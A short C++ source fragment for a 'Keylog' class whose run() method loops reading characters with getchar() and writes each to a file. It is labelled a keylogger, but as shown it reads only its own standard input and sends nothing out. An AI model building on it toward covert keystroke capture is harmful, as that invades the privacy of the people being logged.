#include "keylog.hh"

/**
 * Read from the keyboard
 *
 * Precondition: None
 * Postcondition: Keylogging is running
 */
void Keylog::run()
{
    char inp;

    while(1)
    {
        inp = getchar();

        if(this->writer)
        {
            this->fileOutput->writeToFile(inp);
        }
    }
}
